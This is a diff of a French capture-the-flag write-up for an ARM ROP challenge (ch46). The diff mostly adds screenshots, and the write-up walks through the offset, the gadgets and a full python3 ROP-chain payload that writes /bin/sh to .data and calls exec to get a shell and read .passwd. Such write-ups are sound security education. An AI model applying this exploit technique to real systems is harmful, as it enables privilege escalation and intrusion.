@@ -12,17 +12,22 @@ Pour commencer voici les protections du binaire:
 
 Ici il y a l'ASLR ce qui signifie que nous ne pouvons utiliser des gadgets uniquement de notre binaire et non des librairies externes car nous ne connaissons pas leurs adresses.
 
-Tout d'abord essayons de faire crash notre binaire:
+Tout d'abord essayons de faire crash notre binaire :
 
- 
- En analysant dans gdb et en utilisant un pattern create de 100:
+<img src="/writeups-img/arm-01-crash.png" alt="Crash du binaire — segmentation fault" />
+
+En analysant dans gdb et en utilisant un pattern create de 100 :
+
+<img src="/writeups-img/arm-02-gdb-offset.png" alt="Analyse gdb — contrôle de $pc à l'offset 69" />
 
 On controle donc $pc à partir de l'offset 69.
 
 Voila qui est déja un bon début.
 Analysons davantage le binaire pour ce que nous pouvons faire pour l'exploiter à notre avantage.
 
-En faisant nm ch46 on peut voir toutes les fonctions chargées dans le binaire dont une qui est très intéressante: exec.
+En faisant nm ch46 on peut voir toutes les fonctions chargées dans le binaire dont une qui est très intéressante : exec.
+
+<img src="/writeups-img/arm-03-disas-exec.png" alt="Désassemblage de la fonction exec (geteuid, setreuid, system)" />
 
 Cette fonction fait appel au combo geteuid et setreuid, et appelle ensuiste system. 
 C'EST PARFAIT.
@@ -30,15 +35,27 @@ C'EST PARFAIT.
 Maintenant nous devons nous débrouiller pour donner à exec le bon argument comme par exemple un char* sur "/bin/sh".
 Evidemment le string /bin/sh n'est pas présent dans le binaire, et nous devons donc trouver le moyen de l'écrire quelque part en mémoire et passer cette adresse à exec.
 
-Pour commencer, examinons la zone mémoire possible à exploiter pour ceci:
+Pour commencer, examinons la zone mémoire possible à exploiter pour ceci :
+
+<img src="/writeups-img/arm-04-vmmap.png" alt="vmmap — cartographie mémoire du processus" />
+
+<img src="/writeups-img/arm-05-data-hexdump.png" alt="Segment .data — nombreux octets nuls disponibles" />
+
+<img src="/writeups-img/arm-06-data-page.png" alt="Détail de la page .data (0x00021000)" />
 
 Nous allons pouvoir écrire notre string ici, dans le segement data de notre binaire, il y a énormément d'octets de disponibles.
 
-Allons désormais trouver les gadgets à l'aide de ROPgadget:
+Allons désormais trouver les gadgets à l'aide de ROPgadget :
+
+<img src="/writeups-img/arm-07-ropgadget-pop.png" alt="Gadgets pop {r3, pc} et pop {r4, pc}" />
 
 0x00010598 : pop {r4, pc} et 0x00010410 : pop {r3, pc} nous serons très utile, on les garde de coté.
 
+<img src="/writeups-img/arm-08-ropgadget-strb.png" alt="Gadget strb r3, [r4] ; pop {r4, pc}" />
+
 Le gadget 0x00010594 : strb r3, [r4] ; pop {r4, pc} est parfait il nous permettra d'écrire à l'adresse spcécifiée dans r4.
+
+<img src="/writeups-img/arm-09-ropgadget-mov.png" alt="Gadget mov r0, r3 ; pop {fp, pc}" />
 
 0x00010654 : mov r0, r3 ; sub sp, fp, #4 ; pop {fp, pc}} Ce gadget est parfait aussi, il nous permettra de mettre la valeur de r3 and r0 comme l'adresse de /bin/sh.
 
@@ -65,7 +82,9 @@ Notre payload ressemble donc à ceci :
 python3 -c "import sys; sys.stdout.buffer.write(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa' + b'\x90\x15\x02\x00' + b'\x98\x05\x01\x00' + b'\x50\x16\x02\x00' + b'\x10\x04\x01\x00' + b'////' + b'\x94\x05\x01\x00' + b'\x51\x16\x02\x00' + b'\x10\x04\x01\x00' + b'bbbb' + b'\x94\x05\x01\x00' + b'\x52\x16\x02\x00' + b'\x10\x04\x01\x00' + b'iiii' + b'\x94\x05\x01\x00' + b'\x53\x16\x02\x00' + b'\x10\x04\x01\x00' + b'nnnn' + b'\x94\x05\x01\x00' + b'\x54\x16\x02\x00' + b'\x10\x04\x01\x00' + b'////' + b'\x94\x05\x01\x00' + b'\x55\x16\x02\x00' + b'\x10\x04\x01\x00' + b'ssss' + b'\x94\x05\x01\x00' + b'\x56\x16\x02\x00' + b'\x10\x04\x01\x00' + b'hhhh' + b'\x94\x05\x01\x00' + b'\x90\x15\x02\x00' + b'\x10\x04\x01\x00' + b'\xa8\xa8\xa8\xa8' + b'\x94\x05\x01\x00'+ b'\x91\x15\x02\x00' + b'\x10\x04\x01\x00' + b'\x05\x05\x05\x05' + b'\x94\x05\x01\x00'+ b'\x92\x15\x02\x00' + b'\x10\x04\x01\x00' + b'\x01\x01\x01\x01' + b'\x94\x05\x01\x00' + b'\x93\x15\x02\x00' + b'\x10\x04\x01\x00' + b'\x00\x00\x00\x00' + b'\x94\x05\x01\x00' + b'ffff' + b'\x10\x04\x01\x00' + b'\x50\x16\x02\x00' + b'\x54\x06\x01\x00' + b'\n'"
 ```
 
-En l'exécutant, la ROP chain écrit `/bin/sh` dans le segment data puis redirige l'exécution vers `exec`, ce qui donne un shell avec les droits du binaire (`uid=1146(app-systeme-ch46)`) et permet de lire le fichier `.passwd`.
+En l'exécutant, la ROP chain écrit `/bin/sh` dans le segment data puis redirige l'exécution vers `exec`, ce qui donne un shell avec les droits du binaire et permet de lire le fichier `.passwd` :
+
+<img src="/writeups-img/arm-10-shell-flag.png" alt="Exécution du payload — shell obtenu et lecture du .passwd" />
 
 ## Flag
 
